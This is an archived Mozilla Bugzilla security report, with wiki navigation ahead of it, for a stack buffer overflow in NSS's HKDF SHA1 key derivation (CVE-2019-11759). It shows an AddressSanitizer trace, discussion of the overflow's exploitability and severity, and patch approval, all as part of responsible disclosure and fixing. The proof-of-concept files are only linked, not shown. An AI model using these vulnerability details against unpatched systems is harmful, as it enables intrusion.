* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from bugzilla.mozilla.org_ae6d1540_20250121_000031.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1577953)
* [XML](/show_bug.cgi?ctype=xml&id=1577953)

Closed
[Bug 1577953](/show_bug.cgi?id=1577953)
(CVE-2019-11759)

Opened 5 years ago
Closed 5 years ago

# HKDF SHA1 stack buffer overflow (write)

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

HKDF SHA1 stack buffer overflow (write)

## Categories

### (NSS :: Libraries, defect, P1)

[Product:](/describecomponents.cgi?product=NSS)

NSS
▾

NSS
Network Security Services - a cross-platform
security library ([more info](http://www.mozilla.org/projects/security/pki/nss/))
[See Open Bugs in This Product](/buglist.cgi?product=NSS&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=NSS)
Watch This Product

[Component:](/describecomponents.cgi?product=NSS&component=Libraries#Libraries)

Libraries
▾

NSS :: Libraries
Libraries for client support of SSL v2 and v3, TLS, PKCS #5,
PKCS #7, PKCS #11, PKCS #12, S/MIME, X.509 v3 certificates,
and other security standards
[See Open Bugs in This Component](/buglist.cgi?product=NSS&component=Libraries&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=NSS&component=Libraries&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=NSS&component=Libraries)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

other

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

## Tracking

### (firefox-esr60 wontfix, firefox-esr6870+ fixed, firefox67 wontfix, firefox68 wontfix, firefox69- wontfix, firefox70+ fixed, firefox71+ fixed)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

3.47

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr60 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix) |
| firefox-esr68 | [70+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=70%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox67 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=wontfix) |
| firefox68 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix) |
| firefox69 | [-](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=-) | [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix) |
| firefox70 | [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed) |
| firefox71 | [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr60 |  | wontfix |
| firefox-esr68 | 70+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox67 |  | wontfix |
| firefox68 |  | wontfix |
| firefox69 | - | wontfix |
| firefox70 | + | fixed |
| firefox71 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: guidovranken, Assigned: kjacobs)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/37ada3382011f10c6afb586fe07b6215?d=mm&size=40)  [kjacobs](/user_profile?user_id=636914)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

![](https://secure.gravatar.com/avatar/078db09f952a32d7a60ed0a6d149c40d?d=mm&size=40)  [jcj](/user_profile?user_id=520206)

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/4c36ae160a9613b0ae5a86d1c4b4865c?d=mm&size=40)  [guidovranken](/user_profile?user_id=569399)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=40)  [beurdouche](/user_profile?user_id=622637)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

11 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[1585429](/show_bug.cgi?id=1585429 "RESOLVED FIXED - Tests for bug 1577953")

[1566873](/show_bug.cgi?id=1566873 "RESOLVED FIXED - Upgrade Firefox ESR 68 to use NSS 3.44.2"), [1581998](/show_bug.cgi?id=1581998 "RESOLVED FIXED - Upgrade Firefox 70 to use NSS 3.46.1")

Dependency [tree](/showdependencytree.cgi?id=1577953&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1577953)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (5 keywords, Whiteboard: [reporter-external] [client-bounty-form] [verif?][adv-main70+][adv-esr68.2+][post-critsmash-triage])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2019-11759

[Keywords:](/describekeywords.cgi)

[crash](/buglist.cgi?keywords=crash&resolution=---),
[csectype-bounds](/buglist.cgi?keywords=csectype-bounds&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][adv-main70+][adv-esr68.2+][post-critsmash-triage]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a3249085_1689 "5 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [jcj](/user_profile?user_id=520206) | [in-testsuite](#a2733978_520206 "5 years ago") | ? |
| --- | --- | --- |
| [jcj](/user_profile?user_id=520206) | in-testsuite | ? |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | [qe-verify](#a3846856_458188 "5 years ago") | + |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | qe-verify | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (4 files, 1 obsolete file)

| [poc\_hkdf\_sha1\_oob\_write.cpp](/attachment.cgi?id=9089594)  [5 years ago](#c0)  [Guido Vranken](/user_profile?user_id=569399)   1.50 KB, text/x-c++src |  | [Details](/attachment.cgi?id=9089594&action=edit) |
| --- | --- | --- |
| [proof-of-concept (trigger ASAN in Firefox)](/attachment.cgi?id=9089684)  [5 years ago](#c2)  [Guido Vranken](/user_profile?user_id=569399)   733 bytes, text/html |  | [Details](/attachment.cgi?id=9089684&action=edit) |
| [Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs](/attachment.cgi?id=9091567)  [5 years ago](#c3)  [Kevin Jacobs [:kjacobs]](/user_profile?user_id=636914)   47 bytes, text/x-phabricator-request | abillings : [sec-approval+](#a2251682_280903 "5 years ago") | [Details](/attachment.cgi?id=9091567&action=edit) | [Review](/attachment.cgi?id=9091567) |
| [Bug 1577953 - Add HKDF test vectors](/attachment.cgi?id=9091889)  [5 years ago](#c5)  [Kevin Jacobs [:kjacobs]](/user_profile?user_id=636914)   47 bytes, text/x-phabricator-request |  | [Details](/attachment.cgi?id=9091889&action=edit) | [Review](/attachment.cgi?id=9091889) |
| [advisory.txt](/attachment.cgi?id=9100551)  [5 years ago](#c19)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   238 bytes, text/plain |  | [Details](/attachment.cgi?id=9100551&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Guido Vranken](/user_profile?user_id=569399)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1577953#c0)• 5 years ago |
|  | |

Attached file
[poc\_hkdf\_sha1\_oob\_write.cpp](attachment.cgi?id=9089594)
— [Details](attachment.cgi?id=9089594&action=edit)

=================================================================

==31990==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc26494f80 at pc 0x000000afd696 bp 0x7ffc26494910 sp 0x7ffc26494908

WRITE of size 4 at 0x7ffc26494f80 thread T0

#0 0xafd695 in SHA1\_End /home/jhg/nss/nss/out/Debug/../../lib/freebl/sha\_fast.c:174:5

#1 0x97e8ce in HMAC\_Finish /home/jhg/nss/nss/out/Debug/../../lib/freebl/alghmac.c:133:5

#2 0x68fcca in NSC\_DeriveKey /home/jhg/nss/nss/out/Debug/../../lib/softoken/pkcs11c.c:7951:21

#3 0x56b033 in PK11\_DeriveWithTemplate /home/jhg/nss/nss/out/Debug/../../lib/pk11wrap/pk11skey.c:1609:15

#4 0x569c3f in PK11\_Derive /home/jhg/nss/nss/out/Debug/../../lib/pk11wrap/pk11skey.c:1465:12

#5 0x5192eb in main /home/jhg/nss/cryptofuzz/poc\_hkdf\_sha1\_oob\_write.cpp:38:28

#6 0x7f169494eb96 in \_\_libc\_start\_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

#7 0x41c729 in \_start (/home/jhg/nss/cryptofuzz/a.out+0x41c729)

Address 0x7ffc26494f80 is located in stack of thread T0 at offset 800 in frame

#0 0x681abf in NSC\_DeriveKey /home/jhg/nss/nss/out/Debug/../../lib/softoken/pkcs11c.c:6504

This frame has 34 object(s):

[32, 40) 'crv' (line 6519)

[64, 65) 'cktrue' (line 6520)

[80, 88) 'keyType' (line 6521)

[112, 120) 'classType' (line 6522)

[144, 148) 'outLen' (line 6530)

[160, 180) 'sha\_out' (line 6531)

[224, 800) 'key\_block' (line 6532) <== Memory access at offset 800 overflows this variable

[928, 992) 'crsrdata' (line 6711)

[1024, 1048) 'crsr' (line 6793)

[1088, 1112) 'master' (line 6794)

[1152, 1176) 'pms' (line 6795)

[1216, 1240) 'pms231' (line 6877)

[1280, 1304) 'seed' (line 6878)

[1344, 1368) 'master232' (line 6879)

[1408, 1472) 'srcrdata' (line 6978)

[1504, 1568) 'crsrdata310' (line 6979)

[1600, 1624) 'srcr' (line 7075)

[1664, 1688) 'keyblk' (line 7076)

[1728, 1752) 'master375' (line 7077)

[1792, 1816) 'des3key' (line 7211)

[1856, 1880) 'derived' (line 7659)

[1920, 1944) 'dhPublic' (line 7659)

[1984, 2008) 'dhPrime' (line 7660)

[2048, 2072) 'dhSubPrime' (line 7660)

[2112, 2136) 'dhValue' (line 7660)

[2176, 2200) 'ecScalar' (line 7707)

[2240, 2264) 'ecPoint' (line 7707)

[2304, 2328) 'tmp' (line 7708)

[2368, 2376) 'secret' (line 7710)

[2400, 2424) 'newPoint' (line 7742)

[2464, 2528) 'hashbuf' (line 7863)

[2560, 2564) 'bufLen' (line 7897)

[2576, 2577) 'bi' (line 7934)

[2592, 2596) 'len1088' (line 7942)

HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext

(longjmp and C++ exceptions *are* supported)

SUMMARY: AddressSanitizer: stack-buffer-overflow /home/jhg/nss/nss/out/Debug/../../lib/freebl/sha\_fast.c:174:5 in SHA1\_End

Shadow bytes around the buggy address:

0x100004c8a9a0: 00 00 04 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00

0x100004c8a9b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

0x100004c8a9c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

0x100004c8a9d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

0x100004c8a9e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

=>0x100004c8a9f0:[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2

0x100004c8aa00: f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f2

0x100004c8aa10: f2 f2 f2 f2 f8 f8 f8 f2 f2 f2 f2 f2 f8 f8 f8 f2

0x100004c8aa20: f2 f2 f2 f2 f8 f8 f8 f2 f2 f2 f2 f2 f8 f8 f8 f2

0x100004c8aa30: f2 f2 f2 f2 f8 f8 f8 f2 f2 f2 f2 f2 f8 f8 f8 f8

0x100004c8aa40: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8

Shadow byte legend (one shadow byte represents 8 application bytes):

Addressable: 00

Partially addressable: 01 02 03 04 05 06 07

Heap left redzone: fa

Freed heap region: fd

Stack left redzone: f1

Stack mid redzone: f2

Stack right redzone: f3

Stack after return: f5

Stack use after scope: f8

Global redzone: f9

Global init order: f6

Poisoned by user: f7

Container overflow: fc

Array cookie: ac

Intra object redzone: bb

ASan internal: fe

Left alloca redzone: ca

Right alloca redzone: cb

==31990==ABORTING

Flags: sec-bounty?

|  | [Guido Vranken](/user_profile?user_id=569399)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1577953#c1)• 5 years ago |
|  | |

I cannot compile and test Firefox right now, but it looks like this might be accessible through WebCrypto

|  | [Guido Vranken](/user_profile?user_id=569399)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1577953#c2)• 5 years ago |
|  | |

Attached file
[proof-of-concept (trigger ASAN in Firefox)](attachment.cgi?id=9089684)
— [Details](attachment.cgi?id=9089684&action=edit)

Firefox confirmed vulnerable.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a196846_159069)• 5 years ago |

Assignee: nobody → nobodyGroup: firefox-core-security → crypto-core-securityComponent: Security → LibrariesProduct: Firefox → NSSQA Contact: jjonesVersion: unspecified → other

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a314194_520206)• 5 years ago |

Assignee: nobody → kjacobs.bugzillaSeverity: normal → criticalStatus: UNCONFIRMED → ASSIGNEDType: task → defect
[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected)
[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)Ever confirmed: trueKeywords: [csectype-bounds](/buglist.cgi?keywords=csectype-bounds&resolution=---),
[csectype-dos](/buglist.cgi?keywords=csectype-dos&resolution=---)Priority: -- → P1

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a484966_1689)• 5 years ago |

Keywords: [csectype-dos](/buglist.cgi?keywords=csectype-dos&resolution=---) → [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a484978_1689)• 5 years ago |

Keywords: [crash](/buglist.cgi?keywords=crash&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

|  | [Liz Henry (:lizzard) (relman/hg->git project)](/user_profile?user_id=451704) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a485100_451704)• 5 years ago |

[tracking-firefox69](/buglist.cgi?f1=cf_tracking_firefox69&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%3F)
[tracking-firefox70](/buglist.cgi?f1=cf_tracking_firefox70&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B)

|  | [Kevin Jacobs [:kjacobs]](/user_profile?user_id=636914)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1577953#c3)• 5 years ago |
|  | |

Attached file
[Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs](attachment.cgi?id=9091567)
— [Details](attachment.cgi?id=9091567&action=edit)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a845336_600971)• 5 years ago |

[Attachment #9091567](/attachment.cgi?id=9091567&action=edit "Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs") -
Attachment description: Bug 1577953 - Allocate space for longer HKDF expensions when necessary → Bug 1577953 - Allocate space for longer HKDF expansions when necessary

|  | [Kevin Jacobs [:kjacobs]](/user_profile?user_id=636914)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1577953#c4)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1577953&comment_id=14353492 "1 revision") |
|  | |

I'm downgrading this to sec-moderate. Because of a separate (functional) issue in checking the max output length, the overflow is limited to four bytes of pseudorandom data.

Patch incoming, just adding some additional tests for HKDF.

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-low](/buglist.cgi?keywords=sec-low&resolution=---)

|  | [Kevin Jacobs [:kjacobs]](/user_profile?user_id=636914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a924309_636914)• 5 years ago |

Keywords: [sec-low](/buglist.cgi?keywords=sec-low&resolution=---) → [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Kevin Jacobs [:kjacobs]](/user_profile?user_id=636914)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1577953#c5)• 5 years ago |
|  | |

Attached file
[Bug 1577953 - Add HKDF test vectors](attachment.cgi?id=9091889) (obsolete)
— [Details](attachment.cgi?id=9091889&action=edit)

Adds test vectors for SHA1/256/512 HKDF. This includes the RFC test vectors, as well as upper-bound length checks for the output key material.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a993435_75935)• 5 years ago |

[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix)
[tracking-firefox69](/buglist.cgi?f1=cf_tracking_firefox69&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%3F) → [-](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=-)

|  | [Guido Vranken](/user_profile?user_id=569399)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1577953#c6)• 5 years ago |
|  | |

(In reply to Kevin Jacobs [:kjacobs] from [comment #4](/show_bug.cgi?id=1577953#c4 "RESOLVED FIXED - HKDF SHA1 stack buffer overflow (write)"))

> I'm downgrading this to sec-moderate. Because of a separate (functional) issue in checking the max output length, the overflow is limited to four bytes of random data.

What do you mean by "random data"? If the AddressSanitizer report is correct, a stack field is overwritten. How the stack is laid out is determined by the compiler and can differ across compiler/NSS versions.

There are over a dozen pointer variables in NSC\_DeriveKey that if (partially) overwritten could result in more serious issues.

Flags: needinfo?(kjacobs.bugzilla)

|  | [Guido Vranken](/user_profile?user_id=569399)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1577953#c7)• 5 years ago |
|  | |

Ping

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1577953#c8)• 5 years ago |
|  | |

The data that overwrites is the output of the HMAC, which isn't random, though it's only controllable by trial-and-error.

Going by the definitions for the security severity ratings [1], I think this one is pretty split between sec-high and sec-moderate and would need real effort to determine exactly how useful this would be as a widget. The primary pusher for me to sec-moderate is that it's at the end of the function, so whatever stack overwrite happens needs to do its job quickly. However, there *are* opportunities for that (particularly during `sftk_DestroyObject`), so it's far from cut-and-dry.

Since it could go either way here, I'm going to err on the side of caution here and re-assign this to sec-high.

I really do appreciate your attention to these bugs and reporting them, Guido. Thank you for the continued help! We appreciate it a lot - keep up the good work. Sorry for the delays here, I've been traveling.

[1] <https://wiki.mozilla.org/Security_Severity_Ratings>

Flags: needinfo?(kjacobs.bugzilla)Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---) → [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1577953#c9)• 5 years ago |
|  | |

[Tracking Requested - why for this release]:

We'll want to collect this fix into a point release of NSS 3.44 for ESR and NSS 3.46 for Beta. I'll start the tracking bugs.

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a1547466_520206)• 5 years ago |

Blocks: [1566873](/show_bug.cgi?id=1566873 "RESOLVED FIXED - Upgrade Firefox ESR 68 to use NSS 3.44.2")

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a1547679_520206)• 5 years ago |

Blocks: [1581998](/show_bug.cgi?id=1581998 "RESOLVED FIXED - Upgrade Firefox 70 to use NSS 3.46.1")

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1577953#c10)• 5 years ago |
|  | |

Comment on [attachment 9091567](/attachment.cgi?id=9091567 "Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs") [[details]](/attachment.cgi?id=9091567&action=edit "Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs")

[Bug 1577953](/show_bug.cgi?id=1577953 "RESOLVED FIXED - HKDF SHA1 stack buffer overflow (write)") - Support longer (up to RFC maximum) HKDF outputs

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: It's easy to cause the effect, but it's not clear how easy this widget would be, as it overwrites four bytes within the stack which are *unlikely* to be important, but it's not been analyzed on all platforms to be sure that they're unimportant.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: Yes
* **Which older supported branches are affected by this flaw?**: All
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**: We're planning simultaneous releases of NSS for Firefox 70 Beta and for Firefox 68 ESR, with a landing into Firefox Nightly at the same time. Release Management has requested landing dates of 2 October for compat testing (<https://bugzilla.mozilla.org/show_bug.cgi?id=1581998#c2>).
* **How likely is this patch to cause regressions; how much testing does it need?**: Very low chance of regressions.
[Attachment #9091567](/attachment.cgi?id=9091567&action=edit "Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs") -
Flags: sec-approval?

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1577953#c11)• 5 years ago |
|  | |

sec-approval+ for trunk. We'll want beta and ESR68 patches as well to match the requests made by release management.

[tracking-firefox71](/buglist.cgi?f1=cf_tracking_firefox71&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F) → [71+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=71%2B)

